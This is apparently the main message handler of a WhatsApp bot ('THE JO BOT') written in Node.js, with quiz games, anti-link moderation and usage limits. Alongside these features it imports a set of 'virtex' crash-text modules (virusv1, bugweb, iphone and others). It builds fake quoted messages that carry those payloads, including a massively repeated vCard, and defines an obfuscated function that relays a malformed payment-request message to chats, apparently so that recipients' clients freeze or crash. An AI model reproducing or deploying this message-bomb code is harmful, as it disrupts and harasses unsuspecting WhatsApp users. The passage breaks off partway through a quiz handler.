
require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { buttonfour } = require('./virtex/buttonfour')
const { virusv1 } = require('./virtex/virusv1')
const { virusv3 } = require('./virtex/virusv3')
const { iphone } = require('./virtex/iphone')
const { philips } = require('./virtex/philips')
const { kanjut } = require('./virtex/kanjut')
const { doctext } = require('./virtex/doctext')
const { bugweb } = require('./virtex/bugweb')
const { ngazap } = require('./virtex/ngazap')
const { virusloc } = require('./virtex/virusloc')
const { viruskon } = require('./virtex/viruskon')
const { doc } = require('./virtex/doc')
const { four } = require('./virtex/four')
const { thejo } = require('./virtex/thejo')
const { jobot } = require('./virtex/jobot')
const { jobot2 } = require('./virtex/jobot2')
const { virtex1 } = require('./virtex/virtex1')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
virgam = fs.readFileSync(`./src/virgam yg ganas.jpeg`)

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const banned = JSON.parse(fs.readFileSync('./lib/banned.json'))
const { color, bgcolor } = require('./lib/color')
module.exports = jobotz = async (jobotz, m, chatUpdate, store) => {
await jobotz.readMessages([m.key])

    try {
    //console.log(nomerOwner)
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const isGroup = body.endsWith('@g.us')
        const sender = isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0] 
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await jobotz.decodeJid(jobotz.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const isBan = banned.includes(m.sender)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const from = mek.key.remoteJid
	
        // Group
        const groupMetadata = m.isGroup ? await jobotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const welcm = m.isGroup ? wlcm.includes(from) : true
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const forward = {forwardingScore: 10, isForwarded: true, sendEphemeral: true}
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

const fdocjo = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${thejo}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

const fgamjo = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${thejo}`, 
"jpegThumbnail": virgam
} 
} 
}

const fsticjo = {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"jpegThumbnail": virgam,
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}}}

const fkonjo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE JO BOT\n${thejo}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD`,
"jpegThumbnail": virgam }}}

const jancok = (teks) => {
var _0xec4926=_0x4e61;function _0x4e61(_0x434c13,_0x50470a){var _0x1efd7b=_0x3784();return _0x4e61=function(_0x438905,_0x15a777){_0x438905=_0x438905-0x19d;var _0x103770=_0x1efd7b[_0x438905];return _0x103770;},_0x4e61(_0x434c13,_0x50470a);}function _0x3784(){var _0x3e8843=['search','0@s.whatsapp.net','relayMessage','7UhegRV','return\x20(function()\x20','exception','1931AeGfle','console','prototype','4LPGiZK','8557120LNUWPx','toString','table','constructor','192oerNTo','length','chat','error','1517040mRszJS','trace','apply','6827224BBAqQl','36282Ftzdlk','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','1418421zebmzA','11841181mpuzbz','info','bind','605TkwLbP','log','warn'];_0x3784=function(){return _0x3e8843;};return _0x3784();}(function(_0x1cb5e3,_0x36aa27){var _0x5552f8=_0x4e61,_0x49f8d4=_0x1cb5e3();while(!![]){try{var _0x5588b0=parseInt(_0x5552f8(0x1b7))/0x1*(-parseInt(_0x5552f8(0x19f))/0x2)+parseInt(_0x5552f8(0x1aa))/0x3*(parseInt(_0x5552f8(0x1ba))/0x4)+parseInt(_0x5552f8(0x1ae))/0x5*(-parseInt(_0x5552f8(0x1a7))/0x6)+parseInt(_0x5552f8(0x1b4))/0x7*(-parseInt(_0x5552f8(0x1a6))/0x8)+-parseInt(_0x5552f8(0x1a3))/0x9+parseInt(_0x5552f8(0x1bb))/0xa+parseInt(_0x5552f8(0x1ab))/0xb;if(_0x5588b0===_0x36aa27)break;else _0x49f8d4['push'](_0x49f8d4['shift']());}catch(_0x8e7b94){_0x49f8d4['push'](_0x49f8d4['shift']());}}}(_0x3784,0x71c2c));var _0x51227b=(function(){var _0x12f625=!![];return function(_0x5b691c,_0x11756a){var _0x92567c=_0x12f625?function(){var _0x25516a=_0x4e61;if(_0x11756a){var _0x121f48=_0x11756a[_0x25516a(0x1a5)](_0x5b691c,arguments);return _0x11756a=null,_0x121f48;}}:function(){};return _0x12f625=![],_0x92567c;};}()),_0xbde14b=_0x51227b(this,function(){var _0x4df401=_0x4e61;return _0xbde14b[_0x4df401(0x1bc)]()[_0x4df401(0x1b1)](_0x4df401(0x1a8))[_0x4df401(0x1bc)]()[_0x4df401(0x19e)](_0xbde14b)[_0x4df401(0x1b1)](_0x4df401(0x1a8));});_0xbde14b();var _0x15a777=(function(){var _0x552ea4=!![];return function(_0x5d6799,_0x28d376){var _0x18ac73=_0x552ea4?function(){if(_0x28d376){var _0x32ce48=_0x28d376['apply'](_0x5d6799,arguments);return _0x28d376=null,_0x32ce48;}}:function(){};return _0x552ea4=![],_0x18ac73;};}()),_0x438905=_0x15a777(this,function(){var _0x4df242=_0x4e61,_0x4f48be;try{var _0x4cbe03=Function(_0x4df242(0x1b5)+_0x4df242(0x1a9)+');');_0x4f48be=_0x4cbe03();}catch(_0x178b08){_0x4f48be=window;}var _0x25ecf4=_0x4f48be[_0x4df242(0x1b8)]=_0x4f48be['console']||{},_0x212ccb=[_0x4df242(0x1af),_0x4df242(0x1b0),_0x4df242(0x1ac),_0x4df242(0x1a2),_0x4df242(0x1b6),_0x4df242(0x19d),_0x4df242(0x1a4)];for(var _0x400ce5=0x0;_0x400ce5<_0x212ccb[_0x4df242(0x1a0)];_0x400ce5++){var _0x3d104e=_0x15a777[_0x4df242(0x19e)][_0x4df242(0x1b9)][_0x4df242(0x1ad)](_0x15a777),_0x5ba0f9=_0x212ccb[_0x400ce5],_0x1ab0ff=_0x25ecf4[_0x5ba0f9]||_0x3d104e;_0x3d104e['__proto__']=_0x15a777[_0x4df242(0x1ad)](_0x15a777),_0x3d104e[_0x4df242(0x1bc)]=_0x1ab0ff[_0x4df242(0x1bc)][_0x4df242(0x1ad)](_0x1ab0ff),_0x25ecf4[_0x5ba0f9]=_0x3d104e;}});_0x438905();{jobotz[_0xec4926(0x1b3)](m[_0xec4926(0x1a1)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':teks,'currencyCodeIso4217':'IDR','requestFrom':_0xec4926(0x1b2),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});}}
// Function
wm = 'THE JO BOT'

// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

	
	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }

        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!jobotz.public) {
            if (!m.key.fromMe) return
        }

//console 
if (m.message) {
console.log(
'╭──────────────────────────────────────⊰\n│➳[\x1b[1;32m 𝚃𝙷𝙴 𝙹𝙾 𝙱𝙾𝚃 \x1b[1;37m]', time, chalk.
green(),'\n╰──────────────────────────────────────╮','\n╭──────────────────────────────────────╯\n│➳ from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length),'\n╰──────────────────────────────────────⊰')
 }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
    // vn reply
    var vnAdmin = (hehe) => {
   vnnya = fs.readFileSync(`./src/lu siapa anjir.mp3`)
   jobotz.sendMessage(m.chat, {audio: vnnya, mimetype: 'audio/mpeg', ptt:true })
   }
    var vnCreator = (hehe) => {
   vnc = fs.readFileSync(`./src/ga mau.mp3`)
   jobotz.sendMessage(m.chat, {audio: vnc, mimetype: 'audio/mp3', ptt:true })
   }


	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await jobotz.setStatus(`${jobotz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await jobotz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        jobotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: jobotz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, jobotz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        jobotz.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            jobotz.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await jobotz.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, jobotz.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
